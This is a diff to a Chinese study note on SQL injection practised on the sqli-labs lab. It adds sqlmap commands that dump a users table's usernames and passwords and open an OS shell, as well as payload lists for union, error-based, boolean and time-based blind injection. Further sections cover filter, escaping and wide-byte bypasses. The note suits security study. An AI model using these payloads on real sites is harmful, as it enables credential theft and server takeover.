@@ -1,5 +1,3 @@
-
-
 [TOC]
 
 # 一、知识点
@@ -273,7 +271,11 @@ function checkToken() {
 
 9. --random-agent，推荐指定随机UA头，减少被风控几率
 
+10. --batch，跳过交互
+
 #### 总结：
+
+##### Post请求/注入点未知情况：
 
 1. BP复制请求包，保存->request.txt，插入*指定注入参数，如果很少就不需要，直接-p指定就行
 
@@ -283,9 +285,23 @@ function checkToken() {
    python3 sqlmap.py -r request.txt -p "xxx,xxx" --technique=xxx --dbms=xxx --proxy="BP地址,代理地址" --random-agent --tamper=xxx,xxx
    ```
 
-   ```
-   python sqlmap.py -r request.txt -p "ID" --random-agent --tamper=space2comment
-   ```
+
+##### Get请求/注入点已经确定，想让sqlmap爆库而已：
+
+```
+#获取所有数据库名称
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --dbs
+#获取当前数据库
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --current-db
+#获取数据库security所有表名称
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --tables -D security
+#获取数据库security的users表的所有列名
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --columns -D security -T users
+#获取数据库security的users表的username和password列的值
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --dump -D security -T users -C username,password
+#写马
+python sqlmap.py -u "http://192.168.101.16/sqli-labs-master/Less-9/?id=1" --os-shell 
+```
 
 #### 2. JAVA的参数化查询 之 JDBC
 
@@ -1664,3 +1680,489 @@ lname=S&userid=admin'+(select*from(select(sleep(0)))a)+'&pw=admin
    | `if(now()=sysdate(),sleep(0),0)` | 0.2s     |
 
    明显存在时间差异，说明 SQL 被注入执行。
+
+# 三、实践总结
+
+### 注释符选择：
+
+1. 对于可以url编码的内容，可以使用--+
+2. 不能编码的内容使用#
+
+### 1、注入分类
+
+##### 具体使用哪种注入取决：
+
+1. 注入点的确认
+2. 闭合号的确认
+
+#### 1. 语法/注入点
+
+##### select的where处：
+
+​	union注入、条件注入、堆叠注入
+
+##### updata的set处:
+
+1. 条件注入
+
+   ```
+   UPDATE users SET password = 'inject' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 'test')))
+   or
+   UPDATE users SET password = 'inject' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 'test')))='1'
+   ```
+
+##### insert的vaule处：
+
+1. 条件注入：闭合'、而不是')
+
+   ```
+   INSERT INTO users (username, email, created_at) VALUES ('inject', 'john@example.com', NOW());
+   ```
+
+##### delect的where处:
+
+1. 条件注入
+
+   ```
+   "delete from message where id={$_GET['id']}";
+   ```
+
+#### 2. 手法
+
+1. 回显注入：普通回显、报错回显、OOB回显
+2. 条件注入：布尔注入、时间注入
+
+#### 3. 阻碍场景
+
+##### 语法报错回显、select结果回显：
+
+1. 能找到闭合号
+2. 什么注入都可能
+
+##### 只告诉语法错误与否、告诉select执行正确与否：
+
+1. 能找到闭合号
+2. 普通回显不可能
+
+##### 什么都不告诉、但是返回包大小存在区别：
+
+1. 能找到闭合号
+2. 普通回显不可能
+
+##### 什么都不告诉、并且返回包一模一样：
+
+1. 找不到闭合号，**意味什么都是盲注**
+2. 普通回显、布尔注入不可能
+
+### 2、寻找注入点
+
+​	本质是对于数据库操作的敏感程度，可能出现的注入点，从get的参数，到post参数、UA、referer、cookie....
+
+### 2.5、判断有无闭合号
+
+```
++and+1=1--+
++and+1=2--+
+```
+
+### 3、寻找闭合号
+
+#### 本质：
+
+```
+闭合号 与 **闭合号验证表达式** 的返回结果有差异，说明，存在该闭合号
+
+但是：
+	只是闭合号的子集！
+```
+
+**闭合号验证表达式：**（选择使用哪种有效，取决于注入点）
+
+1. 闭合号+闭合号
+
+   **注意：闭合号中有括号时，不适用**
+
+2. 闭合号+注释
+
+3. 闭合号 and '1'=闭合号1
+
+#### 非显示差异：
+
+1. 登录口，指定一个已知的用户名，那么即使没有**任何回显，可以通过成功登录与否判断**，来找到闭合号
+
+### 4、普通回显验证
+
+0. 寻找闭合号
+
+1. 注入万能payload
+
+   ```
+   数字/字符闭合号 union select null--+
+   or
+   数字/字符闭合号 union select null from dual--
+   
+   字符闭合号:
+   	'、"、')、")、'))、"))
+   数字闭合号:
+   	无、)、))
+   ```
+
+2. 调整null的数量找到一个没有报错的
+
+   1. 若是一直**没报错**，可能是**闭合号错**了
+
+   2. 若是一直报错，可能是还没找到正确的列数
+
+   3. 若是union select到很大，改用order by
+
+      ```
+      闭合号 order by 数字--+
+      结果：
+      	列数+1的时候报错
+      ```
+
+3. 找到正确的列，但是没用回显，说明，正常回显无效
+
+   1. 报错回显
+   2. 布尔注入
+   3. ...
+
+### 5、union select回显技巧
+
+1. union前面内容**离谱**
+
+   ```
+   字符型:
+   	' union select 1,2,3--+  -> 前面就留空
+   数字型:
+   	-1 union select 1,2,3--+  -> 就给不可能select出的数字
+   ```
+
+### 6、getshell
+
+![image-20250701124322520](C:\Users\33940\AppData\Roaming\Typora\typora-user-images\image-20250701124322520.png)
+
+### 7、报错回显验证
+
+1. 经过普通回显验证，找到了正确的列，但是不回显
+
+2. 使用各种数据库的报错回显函数
+
+   ```
+   mysql:
+   	数字/字符闭合号 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+   	数字/字符闭合号 AND updatexml(1,concat(0x7e,(Select+'test'),0x7e),1)--+
+   ```
+
+##### 盲注list:
+
+```
+' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+" AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+') AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+')) AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+") AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+")) AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))--+
+or
+' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))='1
+" AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))="1
+') AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))=('
+')) AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))=(('
+") AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))=("
+")) AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT+'test')))=(("
+```
+
+### 8、布尔注入
+
+#### 一、验证
+
+1. 不插入任何东西，仅仅给一个不可能select出来的条件，如果返回的内容和正常select的内容存在差异，说明存在
+
+##### 差异观察技巧：
+
+1. 首先看前端渲染
+2. 看返回包大小
+3. 细致比较返回包
+
+#### 二、手法（仅猜字段）
+
+##### 判断字段长度:
+
+```
+存在的字段+闭合号 and length(database())>5--+
+```
+
+##### 逐个猜：
+
+```
+存在的字段+闭合号+AND+SUBSTRING(database(),1,1)='a'--+
+存在的字段+闭合号+AND+SUBSTRING(database(),1,1)=闭合号+a
+```
+
+### 9、爆库
+
+#### 一、回显注入 
+
+```
+Oracle:
+	SELECT table_name FROM all_tables
+	SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+非oracle:
+	SELECT table_name FROM information_schema.tables
+	SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+
+#### 二、条件注入
+
+自写脚本、sqlmap
+
+##### sqlmap:
+
+```
+#获取所有数据库名称
+python sqlmap.py -u "http://192.168.124.133/Less-9/?id=1" --dbs --proxy="http://127.0.0.1:8080" --random-agent --batch
+#获取当前数据库
+python sqlmap.py -u "http://192.168.124.133/Less-9/?id=1" --current-db
+#获取数据库security所有表名称
+python sqlmap.py -u "http://192.168.124.133/Less-9/?id=1" --tables -D security
+#获取数据库security的users表的所有列名
+python sqlmap.py -u "http://192.168.124.133/Less-9/?id=1" --columns -D security -T users
+#获取数据库security的users表的username和password列的值
+python sqlmap.py -u "http://192.168.124.133/Less-9/?id=1" --dump -D security -T users -C username,password
+#写马
+python sqlmap.py -u "http://192.168.124.133/Less-9/?id=1" --os-shell 
+必加参数：
+	--proxy="http://127.0.0.1:8080" --random-agent --batch
+```
+
+```
+python3 sqlmap.py -r request.txt --technique=union --dbms=mysql --proxy="http://127.0.0.1:8080" --random-agent --batch --dbs
+```
+
+### 10、时间注入
+
+#### 一、验证
+
+```
+存在的字段+闭合号+and+if(1=1,sleep(2),0)--+
+```
+
+##### 盲注list:
+
+```
+' and if(1=1,sleep(2),0)--+
+" and if(1=1,sleep(2),0)--+
+') and if(1=1,sleep(2),0)--+
+") and if(1=1,sleep(2),0)--+
+')) and if(1=1,sleep(2),0)--+
+")) and if(1=1,sleep(2),0)--+
+```
+
+#### 二、手法（仅猜字段）
+
+```
+闭合号+and+if(LENGTH(password)>$1$,sleep(2),0)--+
+闭合号+and+if(SUBSTRING(password,$1$,1)='$a$',sleep(2),0)--+
+```
+
+### 11、猜SQL
+
+1. 登录
+
+   ```
+   SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码';
+   ```
+
+2. 注册
+
+   ```
+   SELECT COUNT(*) FROM users WHERE username = '输入的用户名';
+   ```
+
+   ```
+   INSERT INTO users (username, password) VALUES ('输入的用户名', '输入的密码...');
+   ```
+
+3. 重置密码
+
+   ```
+   UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass';
+   ```
+
+4. 模糊搜索
+
+   ```
+   select username,id,email from member where username like '%$name%'";
+   ```
+
+5. 删除
+
+   ```
+   "delete from message where id={$_GET['id']}";
+   ```
+
+### 12、转义绕过---二次注入
+
+##### 原理：
+
+​	要再次插入sql的语句，从数据库读出来，但是没有经过转义，从转义符插入数据库后会消失！
+
+##### 读出函数：
+
+```
+$row = mysql_fetch_row($res);
+```
+
+##### 场景：
+
+1. 信任session
+
+```
+# 数据库读出
+ 	$_SESSION["username"] = $row;
+# 插入忽略编码
+        $username= $_SESSION["username"];
+        $curr_pass= mysql_real_escape_string($_POST['current_password']);
+        $pass= mysql_real_escape_string($_POST['password']);
+        $re_pass= mysql_real_escape_string($_POST['re_password']);
+```
+
+
+### 13、空格的绕过
+
+#### 其他代替：
+
+| URL编码 | 字符描述         | 适用场景             | 备注                      |
+| :------ | :--------------- | :------------------- | :------------------------ |
+| `%20`   | 普通空格         | 通用                 | 最常被过滤                |
+| `%09`   | 水平制表符(TAB)  | 大多数SQL环境        | MySQL/PostgreSQL等有效    |
+| `%0a`   | 换行符(LF)       | 多行语句场景         | 可分割SQL关键词           |
+| `%0b`   | 垂直制表符(VT)   | 部分数据库系统       | 较少被过滤                |
+| `%0c`   | 换页符(FF)       | 特定数据库           | Oracle/SQL Server可能有效 |
+| `%0d`   | 回车符(CR)       | 与`%0a`组合使用      | `%0d%0a`为Windows换行     |
+| `%a0`   | 不换行空格(NBSP) | 需要多字节编码的环境 | GBK/UTF-8等               |
+
+#### 消除条件空格；
+
+1. 使用||代替or、&&(%26%26)代替and，前者两边不需要空格
+
+2. 使用括号代替空额，比如：and(select null) == and select null
+
+   注：
+
+   ```
+   union(select 1,2,3)  错误!
+   ```
+
+### 14、关键字过滤
+
+双写+大小写:
+
+```
+uNiON
+SEleCT
+Ununionion
+SEselectlect
+uNionUnion select Select
+....
+```
+
+### 15、注释符过滤
+
+#### 闭合号代替：
+
+**ok:**
+
+1. union select null'
+2. and select 'a'='b
+3. **") and '1'=("**、**")&&'1'=("1**
+4. union select null and '1'=("1
+
+**no:**
+
+1. order by 1'
+2. and select a'
+3. union select null("
+4. and select a=b'
+5. and a=b'
+
+### 16、转义符的绕过 - 宽字节编码
+
+#### 原理：
+
+```
+用户输入 → WEB服务器(UTF-8) → 转义处理(GBK、其他多字节编码) → 数据库(GBK、其他多字节编码)
+```
+
+服务端语言编码环境默认是utf-8：
+
+```
+default_charset = "UTF-8"
+```
+
+数据库默认的编码是多字节编码，在转义处理的时候，服务端是按照utf-8的思维，插入一个\反斜杠，根本不知道会不会和前面恶意的前导字符合并。
+
+#### 安全处理：
+
+```
+危险函数：
+	mysql_query("SET NAMES gbk")
+安全：
+	mysql_set_charset('gbk')
+```
+
+#### 反斜杠的GBK前导字符表：
+
+| 前导字节 | 组合字符(GBK) | Unicode | 字符名称        |
+| :------- | :------------ | :------ | :-------------- |
+| **0x81** | 0x815C        | U+E7C7  |  (私有区字符)  |
+| **0xA1** | 0xA15C        | U+FFE5  | ￥ (全角人民币) |
+| **0xA3** | 0xA35C        | U+FF3C  | ＼ (全角反斜线) |
+| **0xA5** | 0xA55C        | U+FFE6  | ￠ (全角分币)   |
+| **0xAA** | 0xAA5C        | U+2571  | ╱ (斜线符号)    |
+| **0xDF** | 0xDF5C        | U+9046  | 運              |
+| **0xE0** | 0xE05C        | U+9093  | 邓              |
+| **0xFD** | 0xFD5C        | U+9FA0  | 龠              |
+
+#### 局限：
+
+​	宽字节注入**只适用于绕过第一个**\过滤，后面再使用，解决不了出现的语法错误。
+
+### 17、引号的绕过
+
+使用16进制编码：静态内容自解码。1
+
+### 18、堆叠注入
+
+#### 验证：
+
+```
+闭合号;+select 1--+  未报错则存在
+```
+
+#### 局限：无显示
+
+1. 即使存在堆叠注入，后端也可能只是输出第一个的执行结果，即使第二个是select if(1=1,sleep(5),0)；也不会睡眠
+
+### 19、条件注入的觉悟
+
+##### 布尔：
+
+1. 不会给任何语法报错
+2. 不会输出超出一个select的信息，所以要使用，**存在的字段+and**，而不是or
+
+##### 时间：
+
+1. sql执行任何语句没有显示差别
+2. 与其他注入不同的是，**只能通过盲时间注入的方式猜闭合号**（其他方式也能，但是时间注入，只能使用这个，因为没有显示参考）
+
+### 20、sqli思路
+
+1. 观察功能，猜测sql语句，注入点
+2. 判断回显等级
+   1. 语法报错回显
+   2. 布尔条件回显（观察要仔细！）
+   3. 时间回显
+3. 按照回显等级猜测：
+   1. 是否存在闭合号
+   2. 闭合号是什么
